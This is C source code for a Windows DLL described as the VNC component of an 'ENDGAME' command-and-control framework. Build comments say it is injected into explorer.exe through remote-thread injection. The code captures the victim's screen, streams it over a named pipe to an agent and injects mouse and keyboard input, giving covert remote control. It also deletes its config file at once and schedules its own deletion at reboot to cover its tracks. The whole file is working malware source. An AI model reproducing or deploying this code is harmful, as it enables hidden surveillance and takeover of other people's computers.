/*
 * vnc_dll.c — ENDGAME C2 VNC reflective DLL
 *
 * Compiled into a Windows DLL (x64) with MinGW.
 * Injected into a target process (e.g. explorer.exe in the interactive session)
 * via classic LoadLibraryA remote thread injection.
 *
 * Entry: DllMain reads a sidecar .cfg file to get named-pipe name + JPEG quality,
 *        then spawns VNCMain in a background thread and returns.
 *
 * Pipe protocol (DLL → agent):
 *   [1B type][4B len LE][payload]
 *   0x02 INFO    JSON {"w":N,"h":N}
 *   0xF0 RAWFRAME [4B w][4B h][BGRA pixels] (agent encodes JPEG)
 *   0x03 PONG    (reply to PING)
 *
 * Agent → DLL:
 *   0x10 MOUSE_MOVE  [4B x][4B y]
 *   0x11 MOUSE_CLICK [4B x][4B y][1B btn 1/2/3][1B down]
 *   0x12 MOUSE_WHEEL [4B delta signed]
 *   0x13 KEY         [2B vk][1B down]
 *   0x14 STOP
 *   0x15 PING
 *   0x16 QUALITY     [1B 1-100] (ignored — quality controls JPEG on agent side)
 *
 * Build: x86_64-w64-mingw32-gcc -shared -O2 -o vnc_dll_x64.dll vnc_dll.c
 *         -lgdi32 -luser32 -lkernel32 -mwindows -s
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

/* ── Protocol constants ─────────────────────────────────────────────────── */
#define VNC_FRAME       0x01
#define VNC_INFO        0x02
#define VNC_PONG        0x03
#define VNC_RAWFRAME    0xF0
#define VNC_MOUSE_MOVE  0x10
#define VNC_MOUSE_CLICK 0x11
#define VNC_MOUSE_WHEEL 0x12
#define VNC_KEY         0x13
#define VNC_STOP        0x14
#define VNC_PING        0x15
#define VNC_QUALITY     0x16

/* MOUSEEVENTF flags not always in older SDKs */
#ifndef MOUSEEVENTF_VIRTUALDESK
#define MOUSEEVENTF_VIRTUALDESK 0x4000
#endif

/* ── State ──────────────────────────────────────────────────────────────── */
static volatile LONG g_stop = 0;

/* ── Wire I/O helpers ───────────────────────────────────────────────────── */

static BOOL pipe_write_all(HANDLE h, const void *buf, DWORD n) {
    const BYTE *p = (const BYTE *)buf;
    while (n > 0) {
        DWORD w = 0;
        if (!WriteFile(h, p, n, &w, NULL) || w == 0)
            return FALSE;
        p += w;
        n -= w;
    }
    return TRUE;
}

static BOOL pipe_read_all(HANDLE h, void *buf, DWORD n) {
    BYTE *p = (BYTE *)buf;
    while (n > 0) {
        DWORD r = 0;
        if (!ReadFile(h, p, n, &r, NULL) || r == 0)
            return FALSE;
        p += r;
        n -= r;
    }
    return TRUE;
}

/* Send a framed message: [1B type][4B len LE][payload] */
static BOOL send_frame(HANDLE pipe, uint8_t type, const void *payload, uint32_t len) {
    uint8_t hdr[5];
    hdr[0] = type;
    hdr[1] = (uint8_t)(len & 0xFF);
    hdr[2] = (uint8_t)((len >> 8) & 0xFF);
    hdr[3] = (uint8_t)((len >> 16) & 0xFF);
    hdr[4] = (uint8_t)((len >> 24) & 0xFF);
    if (!pipe_write_all(pipe, hdr, 5))
        return FALSE;
    if (len > 0 && !pipe_write_all(pipe, payload, len))
        return FALSE;
    return TRUE;
}

/* Read one frame header + payload. Returns heap-allocated payload (must HeapFree). */
static BOOL read_frame(HANDLE pipe, uint8_t *type_out, BYTE **data_out, uint32_t *len_out) {
    uint8_t hdr[5];
    if (!pipe_read_all(pipe, hdr, 5))
        return FALSE;
    *type_out = hdr[0];
    *len_out  = (uint32_t)hdr[1]
              | ((uint32_t)hdr[2] << 8)
              | ((uint32_t)hdr[3] << 16)
              | ((uint32_t)hdr[4] << 24);
    if (*len_out > 64 * 1024 * 1024) /* sanity: 64 MB max */
        return FALSE;
    if (*len_out > 0) {
        *data_out = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *len_out);
        if (!*data_out)
            return FALSE;
        if (!pipe_read_all(pipe, *data_out, *len_out)) {
            HeapFree(GetProcessHeap(), 0, *data_out);
            return FALSE;
        }
    } else {
        *data_out = NULL;
    }
    return TRUE;
}

/* ── Input dispatch ─────────────────────────────────────────────────────── */

static void dispatch_input(uint8_t type, const BYTE *p, uint32_t plen) {
    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int sx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int sy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    if (sw <= 0) { sw = GetSystemMetrics(SM_CXSCREEN); sx = 0; }
    if (sh <= 0) { sh = GetSystemMetrics(SM_CYSCREEN); sy = 0; }

    INPUT inp;
    ZeroMemory(&inp, sizeof(inp));

    switch (type) {
    case VNC_MOUSE_MOVE:
        if (plen < 8) return;
        {
            int32_t x = (int32_t)(((uint32_t)p[0]) | ((uint32_t)p[1]<<8) | ((uint32_t)p[2]<<16) | ((uint32_t)p[3]<<24));
            int32_t y = (int32_t)(((uint32_t)p[4]) | ((uint32_t)p[5]<<8) | ((uint32_t)p[6]<<16) | ((uint32_t)p[7]<<24));
            /* x,y are client-relative to virtual screen origin */
            long ax = (long)(65535LL * (x + sx) / (sx + sw));
            long ay = (long)(65535LL * (y + sy) / (sy + sh));
            inp.type = INPUT_MOUSE;
            inp.mi.dx = ax; inp.mi.dy = ay;
            inp.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
            SendInput(1, &inp, sizeof(INPUT));
        }
        break;

    case VNC_MOUSE_CLICK:
        if (plen < 10) return;
        {
            int32_t x = (int32_t)(((uint32_t)p[0]) | ((uint32_t)p[1]<<8) | ((uint32_t)p[2]<<16) | ((uint32_t)p[3]<<24));
            int32_t y = (int32_t)(((uint32_t)p[4]) | ((uint32_t)p[5]<<8) | ((uint32_t)p[6]<<16) | ((uint32_t)p[7]<<24));
            uint8_t btn = p[8], down = p[9];
            long ax = (long)(65535LL * (x + sx) / (sx + sw));
            long ay = (long)(65535LL * (y + sy) / (sy + sh));
            /* Move */
            inp.type = INPUT_MOUSE;
            inp.mi.dx = ax; inp.mi.dy = ay;
            inp.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
            SendInput(1, &inp, sizeof(INPUT));
            /* Click */
            DWORD flags = 0;
            if (btn == 1) flags = down ? MOUSEEVENTF_LEFTDOWN  : MOUSEEVENTF_LEFTUP;
            if (btn == 2) flags = down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
            if (btn == 3) flags = down ? MOUSEEVENTF_MIDDLEDOWN: MOUSEEVENTF_MIDDLEUP;
            if (flags) {
                ZeroMemory(&inp, sizeof(inp));
                inp.type = INPUT_MOUSE;
                inp.mi.dx = ax; inp.mi.dy = ay;
                inp.mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
                SendInput(1, &inp, sizeof(INPUT));
            }
        }
        break;

    case VNC_MOUSE_WHEEL:
        if (plen < 4) return;
        {
            int32_t delta = (int32_t)(((uint32_t)p[0]) | ((uint32_t)p[1]<<8) | ((uint32_t)p[2]<<16) | ((uint32_t)p[3]<<24));
            inp.type = INPUT_MOUSE;
            inp.mi.mouseData = (DWORD)delta;
            inp.mi.dwFlags = MOUSEEVENTF_WHEEL;
            SendInput(1, &inp, sizeof(INPUT));
        }
        break;

    case VNC_KEY:
        if (plen < 3) return;
        {
            WORD vk = (WORD)(((uint16_t)p[0]) | ((uint16_t)p[1] << 8));
            inp.type = INPUT_KEYBOARD;
            inp.ki.wVk = vk;
            inp.ki.dwFlags = p[2] ? 0 : KEYEVENTF_KEYUP;
            SendInput(1, &inp, sizeof(INPUT));
        }
        break;
    }
}

/* ── Input reader thread ────────────────────────────────────────────────── */

typedef struct { HANDLE pipe; } InputReaderCtx;

static DWORD WINAPI input_reader(LPVOID param) {
    HANDLE pipe = ((InputReaderCtx *)param)->pipe;
    HeapFree(GetProcessHeap(), 0, param);

    while (!InterlockedCompareExchange(&g_stop, 0, 0)) {
        /* Peek before blocking read so we can check g_stop */
        DWORD avail = 0;
        if (!PeekNamedPipe(pipe, NULL, 0, NULL, &avail, NULL))
            break;
        if (avail < 5) {
            Sleep(5);
            continue;
        }
        uint8_t type;
        BYTE *payload = NULL;
        uint32_t plen = 0;
        if (!read_frame(pipe, &type, &payload, &plen))
            break;

        if (type == VNC_STOP) {
            InterlockedExchange(&g_stop, 1);
            if (payload) HeapFree(GetProcessHeap(), 0, payload);
            break;
        } else if (type == VNC_PING) {
            send_frame(pipe, VNC_PONG, NULL, 0);
        } else {
            dispatch_input(type, payload, plen);
        }
        if (payload) HeapFree(GetProcessHeap(), 0, payload);
    }
    return 0;
}

/* ── Screen capture context ─────────────────────────────────────────────── */

typedef struct {
    HDC     hdcScreen;
    HDC     hdcMem;
    HBITMAP hBitmap;
    VOID   *bits;   /* BGRA pixels */
    int     x, y, w, h;
} ScreenCtx;

static BOOL init_screen(ScreenCtx *sc, int x, int y, int w, int h) {
    sc->x = x; sc->y = y; sc->w = w; sc->h = h;
    sc->hdcScreen = GetDC(NULL);
    if (!sc->hdcScreen) return FALSE;
    sc->hdcMem = CreateCompatibleDC(sc->hdcScreen);
    if (!sc->hdcMem) return FALSE;

    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = w;
    bmi.bmiHeader.biHeight      = -h; /* top-down */
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    sc->hBitmap = CreateDIBSection(sc->hdcScreen, &bmi, DIB_RGB_COLORS, &sc->bits, NULL, 0);
    if (!sc->hBitmap) return FALSE;
    SelectObject(sc->hdcMem, sc->hBitmap);
    return TRUE;
}

static void free_screen(ScreenCtx *sc) {
    if (sc->hdcMem)    { DeleteDC(sc->hdcMem);    sc->hdcMem = NULL; }
    if (sc->hBitmap)   { DeleteObject(sc->hBitmap); sc->hBitmap = NULL; }
    if (sc->hdcScreen) { ReleaseDC(NULL, sc->hdcScreen); sc->hdcScreen = NULL; }
    sc->bits = NULL;
}

static BOOL capture(ScreenCtx *sc) {
    return BitBlt(sc->hdcMem, 0, 0, sc->w, sc->h,
                  sc->hdcScreen, sc->x, sc->y,
                  SRCCOPY | CAPTUREBLT);
}

/* ── VNC main thread ────────────────────────────────────────────────────── */

typedef struct { char pipeName[256]; int quality; } VNCArgs;

static DWORD WINAPI VNCMain(LPVOID param) {
    VNCArgs *a = (VNCArgs *)param;

    InterlockedExchange(&g_stop, 0);

    /* Create named pipe server (one connection, duplex, byte-mode) */
    HANDLE hPipe = CreateNamedPipeA(
        a->pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,          /* max instances */
        1024*1024,  /* out buf */
        1024*1024,  /* in buf */
        30000,      /* timeout ms */
        NULL
    );
    if (hPipe == INVALID_HANDLE_VALUE)
        goto done;

    /* Wait for agent to connect (up to 30 s) */
    if (!ConnectNamedPipe(hPipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED)
            goto close_pipe;
    }

    /* Determine virtual screen bounds */
    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (vw <= 0) { vw = GetSystemMetrics(SM_CXSCREEN); vx = 0; }
    if (vh <= 0) { vh = GetSystemMetrics(SM_CYSCREEN); vy = 0; }

    /* Send INFO frame */
    char info[128];
    int  info_len = wsprintfA(info, "{\"w\":%d,\"h\":%d}", vw, vh);
    if (!send_frame(hPipe, VNC_INFO, info, (uint32_t)info_len))
        goto close_pipe;

    /* Init GDI capture context */
    ScreenCtx sc;
    ZeroMemory(&sc, sizeof(sc));
    if (!init_screen(&sc, vx, vy, vw, vh))
        goto close_pipe;

    /* Spawn input reader thread */
    InputReaderCtx *ira = (InputReaderCtx *)HeapAlloc(GetProcessHeap(), 0, sizeof(InputReaderCtx));
    if (!ira) goto free_screen;
    ira->pipe = hPipe;
    HANDLE hInput = CreateThread(NULL, 0, input_reader, ira, 0, NULL);

    /* Capture loop ~15 FPS */
    const DWORD FRAME_MS = 66;
    int prevW = vw, prevH = vh;

    while (!InterlockedCompareExchange(&g_stop, 0, 0)) {
        DWORD t0 = GetTickCount();

        /* Resolution change? */
        int newW = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int newH = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        if (newW <= 0) { newW = GetSystemMetrics(SM_CXSCREEN); }
        if (newH <= 0) { newH = GetSystemMetrics(SM_CYSCREEN); }

        if (newW != prevW || newH != prevH) {
            free_screen(&sc);
            vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
            vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
            vw = newW; vh = newH;
            if (!init_screen(&sc, vx, vy, vw, vh)) break;

            info_len = wsprintfA(info, "{\"w\":%d,\"h\":%d}", vw, vh);
            if (!send_frame(hPipe, VNC_INFO, info, (uint32_t)info_len)) break;
            prevW = vw; prevH = vh;
        }

        if (!capture(&sc)) {
            Sleep(FRAME_MS);
            continue;
        }

        /* Build RAWFRAME: [4B w LE][4B h LE][BGRA pixels...] */
        DWORD pixBytes = (DWORD)(vw * vh * 4);
        DWORD rawLen   = 8 + pixBytes;
        BYTE *raw = (BYTE *)HeapAlloc(GetProcessHeap(), 0, rawLen);
        if (!raw) break;

        /* Width and height (little-endian uint32) */
        raw[0] = (BYTE)( vw        & 0xFF);
        raw[1] = (BYTE)((vw >>  8) & 0xFF);
        raw[2] = (BYTE)((vw >> 16) & 0xFF);
        raw[3] = (BYTE)((vw >> 24) & 0xFF);
        raw[4] = (BYTE)( vh        & 0xFF);
        raw[5] = (BYTE)((vh >>  8) & 0xFF);
        raw[6] = (BYTE)((vh >> 16) & 0xFF);
        raw[7] = (BYTE)((vh >> 24) & 0xFF);
        /* GDI DIBSection gives us BGRA (B=byte0, G=byte1, R=byte2, A=byte3=0) */
        memcpy(raw + 8, sc.bits, pixBytes);

        BOOL ok = send_frame(hPipe, VNC_RAWFRAME, raw, rawLen);
        HeapFree(GetProcessHeap(), 0, raw);
        if (!ok) break;

        DWORD elapsed = GetTickCount() - t0;
        if (elapsed < FRAME_MS) Sleep(FRAME_MS - elapsed);
    }

    InterlockedExchange(&g_stop, 1);
    if (hInput) {
        WaitForSingleObject(hInput, 2000);
        CloseHandle(hInput);
    }

free_screen:
    free_screen(&sc);

close_pipe:
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

done:
    HeapFree(GetProcessHeap(), 0, param);
    return 0;
}

/* ── DllMain ────────────────────────────────────────────────────────────── */

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason != DLL_PROCESS_ATTACH)
        return TRUE;
    DisableThreadLibraryCalls(hInst);

    /* Read sidecar config file: {module_path_without_ext}.cfg */
    char modPath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(hInst, modPath, MAX_PATH))
        return TRUE;

    /* Replace extension with ".cfg" */
    char cfgPath[MAX_PATH];
    lstrcpyA(cfgPath, modPath);
    char *dot = strrchr(cfgPath, '.');
    if (!dot) return TRUE;
    lstrcpyA(dot, ".cfg");

    /* Read cfg: "pipeName quality\n" */
    HANDLE hCfg = CreateFileA(cfgPath, GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hCfg == INVALID_HANDLE_VALUE) return TRUE;

    char cfgBuf[512] = {0};
    DWORD nRead = 0;
    ReadFile(hCfg, cfgBuf, sizeof(cfgBuf) - 1, &nRead, NULL);
    CloseHandle(hCfg);

    /* Delete cfg immediately */
    DeleteFileA(cfgPath);

    /* Schedule DLL self-deletion on next reboot */
    MoveFileExA(modPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

    /* Parse: "pipeName quality" */
    VNCArgs *args = (VNCArgs *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VNCArgs));
    if (!args) return TRUE;

    char *sp = strrchr(cfgBuf, ' ');
    if (sp) {
        int qlen = (int)(sp - cfgBuf);
        if (qlen < (int)sizeof(args->pipeName)) {
            memcpy(args->pipeName, cfgBuf, qlen);
            args->pipeName[qlen] = 0;
        }
        args->quality = atoi(sp + 1);
    } else {
        /* No quality field — use default */
        lstrcpynA(args->pipeName, cfgBuf, sizeof(args->pipeName));
        args->quality = 60;
    }
    /* Strip any trailing newline */
    char *nl = strchr(args->pipeName, '\n');
    if (nl) *nl = 0;
    nl = strchr(args->pipeName, '\r');
    if (nl) *nl = 0;

    if (args->quality < 1 || args->quality > 100)
        args->quality = 60;

    /* Spawn VNC thread (fire and forget, DllMain must return quickly) */
    HANDLE ht = CreateThread(NULL, 0, VNCMain, args, 0, NULL);
    if (ht) CloseHandle(ht);
    else    HeapFree(GetProcessHeap(), 0, args);

    return TRUE;
}
